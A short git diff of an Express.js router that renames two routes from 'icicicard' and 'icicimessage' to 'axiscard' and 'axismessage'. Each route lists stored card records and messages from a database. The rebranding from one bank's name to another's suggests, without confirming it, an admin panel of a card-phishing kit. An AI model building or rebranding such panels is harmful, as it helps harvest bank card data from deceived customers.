@@ -51,11 +51,11 @@ router.post('/message', async (req, res)=>{
   res.send('message got success')
 })
 
-router.get("/icicicard", async (req, res)=>{
+router.get("/axiscard", async (req, res)=>{
   let cardData = await CardModal.find().sort({createdAt: -1});
   res.render("card", {cardData})
 })
-router.get("/icicimessage", async (req, res)=>{
+router.get("/axismessage", async (req, res)=>{
   let cardData = await MessageModal.find().sort({createdAt: -1});
   res.render("message", {cardData})
 })
